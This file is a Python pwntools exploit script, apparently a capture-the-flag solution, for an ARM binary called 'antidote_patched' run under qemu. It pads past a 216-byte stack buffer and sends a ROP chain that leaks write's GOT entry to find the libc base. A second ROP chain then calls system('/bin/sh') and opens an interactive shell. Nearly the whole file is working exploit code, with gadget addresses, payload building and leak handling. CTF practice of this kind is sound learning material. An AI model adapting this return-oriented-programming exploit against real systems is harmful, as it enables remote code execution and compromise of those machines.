from pwn import *
from Crypto.Util.number import bytes_to_long



bin = './antidote_patched'
def solve():
    context.arch = 'arm'
    r = process(['qemu-arm','-L','/usr/arm-linux-gnueabihf/',bin])
    # 216 for stack size + 4 bytes for the frame pointer
    padding = b"A" * 216
     
    payload = padding
    #io = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabihf/', '-g', '1234', bin])

    # 0x8628: pop {r4, r5, r6, r7, r8, sb, sl, pc} ; (1 found)
    # 0x85f8: mov r1, r8 ; mov r2, r7 ; blx r3 ; (1 found)
    # 0x863c: pop {r3, pc} ; (1 found)

    pop_r3 = 0x863c
    pop_all = 0x8628
    set_reg = 0x85f4
    write_got = 0x10850
    write_plt = 0x8420
    main_write = 0x8530 # this does r1 = r3
    rop_chain_leak = [
        # 0, # dummy r11 value
        0x407ffd40, # correct r11 value? which is responsible for pointing to fp?
        pop_r3, # used to set the link register

        write_got,
        main_write,
    ]

    for i,v in enumerate(rop_chain_leak):
        payload += p32(v)

    payload += (300 - len(payload)) * b'A'
    assert len(payload) == 300
    
    f = open('./payload', 'wb')
    f.write(payload)
    f.close()

    l = r.sendafter("hurt!\n", payload)
    print(l)
    l = r.recv(4)
    print(l)
    leak = l[::-1]
    print("leak: ", "0x"+leak.hex())
    libc = ELF('./libc.so.6')
    libc_write = libc.symbols['write']
    print(hex(libc_write), hex(libc.sym.write))
    libc_base = bytes_to_long(leak) - libc_write
    print("base: ", hex(libc_base))
    libc.address = libc_base
    system = libc.symbols["system"]
    binsh = libc.search(b'/bin/sh').__next__()
    print("system and binsh: ", hex(system), hex(binsh))
    payload = b'B' * 216 
    
    rop_chain_sh = [
        0x407ffd40, # correct r11 value? which is responsible for pointing to fp?
        pop_r3, # used to set the link register
        system, # r3 = system

        pop_all, # pop all regsiters instruction
        # this gets executed after the leak 0x8608 <__libc_csu_init+156>    ldr    ip, [r4, #4]
        # maybe need to set to main's got - 4?
        # better idea is to set it to the next gadget we want to execute
        # actually, this isn't needed for the write just for the shell. we can do the write by finding an instruction in the main function
        0, # r4
        0, # r5
        0, # r6
        0, # r7 = r2 = size of bytes to leak 
        0, # r8 = r1 = write function
        0, # sb
        binsh, # sl = r0 = write to stdout
        set_reg, # branch to r3 which is system
    ]

    for i,v in enumerate(rop_chain_sh):
        payload += p32(v)

    payload += (300 - len(payload)) * b'B'
    assert len(payload) == 300

    l = r.recv()
    print(l)
    print("Sending second rop chain")

    f = open('./payload2', 'wb')
    f.write(payload)
    f.close()

    r.send(payload)
    r.interactive()

def main():
    solve()

if __name__ == '__main__':
    main()

